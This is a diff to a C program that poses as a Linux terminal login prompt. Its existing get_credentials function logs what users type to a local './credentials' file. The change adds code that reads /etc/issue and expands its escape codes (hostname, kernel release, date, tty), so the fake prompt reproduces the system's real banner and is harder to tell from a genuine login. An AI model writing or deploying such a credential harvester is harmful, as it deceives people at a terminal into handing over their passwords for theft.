@@ -5,6 +5,7 @@
 #include<stdlib.h>
 #include<fcntl.h>
 #include<time.h>
+#include<sys/utsname.h>
 
 #define MAX_INPUT_LENGTH 32
 #define MAX_HOSTNAME_LENGTH 64
@@ -12,6 +13,100 @@
 
 char host[MAX_HOSTNAME_LENGTH];
 char* tty;
+
+
+
+/*
+ * prints special characters from /etc/issue
+ * taken from github.com/ystk/debian-mingetty
+ * slightly modified
+ *
+ * args:
+ *  c - the special character to output
+ */
+static void output_special_char (unsigned char c)
+{
+  struct utsname uts;
+
+  if (uname(&uts) == -1)
+    {
+      perror("uname");
+      exit(EXIT_FAILURE);
+    }
+
+  switch (c) {
+  case 's':
+    printf ("%s", uts.sysname);
+    break;
+  case 'n':
+    printf ("%s", uts.nodename);
+    break;
+  case 'r':
+    printf ("%s", uts.release);
+    break;
+  case 'v':
+    printf ("%s", uts.version);
+    break;
+  case 'm':
+    printf ("%s", uts.machine);
+    break;
+  case 'd':
+  case 't':
+    {
+      time_t cur_time;
+      struct tm *tm;
+      time (&cur_time);
+      tm = localtime (&cur_time);
+      if (c == 'd') /* ISO 8601 */
+	printf ("%d-%02d-%02d", 1900 + tm->tm_year,
+		tm->tm_mon + 1, tm->tm_mday);
+      else
+	printf ("%02d:%02d:%02d", tm->tm_hour,
+		tm->tm_min, tm->tm_sec);
+      break;
+    }
+
+  case 'l':
+    printf ("%s", tty+5);
+    break;
+  case 'u':
+  case 'U':
+    break;
+  default:
+    putchar (c);
+  }
+}
+
+
+/*
+ * reads /etc/issue and prints the banner
+ */
+void print_banner()
+{
+  FILE *fd;
+  char c;
+  struct utsname uts;
+
+  if (uname(&uts) == -1)
+    {
+      perror("uname");
+      exit(EXIT_FAILURE);
+    }
+
+  printf("\n");
+  if ((fd = fopen ("/etc/issue", "r"))) {
+    while ((c = getc (fd)) != EOF) {
+      if (c == '\\')
+	output_special_char (getc (fd));
+      else
+	putchar (c);
+    }
+    fclose (fd);
+  }
+}
+
+
+
 /**
  * gets user's credentials and stores them into the specified file
  *
@@ -31,11 +126,9 @@ int get_credentials(char* filepath)
   char timestamp[32];
   int fd = 0;
   
+  // open file to log credentials
   if (filepath == NULL)
     filepath = "./credentials";
-
-  printf("\nDebian GNU/Linux 7 %s (%s)\n\n", host, tty+5);
-
 
   fd = open(filepath, O_RDWR | O_CREAT | O_APPEND, 0600);
   if(fd == -1)
@@ -44,6 +137,10 @@ int get_credentials(char* filepath)
       perror("open");
       return -1;
     }
+
+  // pass issue file to print_banner
+  print_banner();
+
   printf("%s login: ",host);
   fgets(user, MAX_INPUT_LENGTH, stdin);
 
@@ -126,8 +223,6 @@ int main(int argc, char *argv[])
   // mimic original behaviour when no username is supplied
   do
     {
-      // TODO: fix (uname)
-
       ret = get_credentials(filepath);
 
       if (ret == 0)
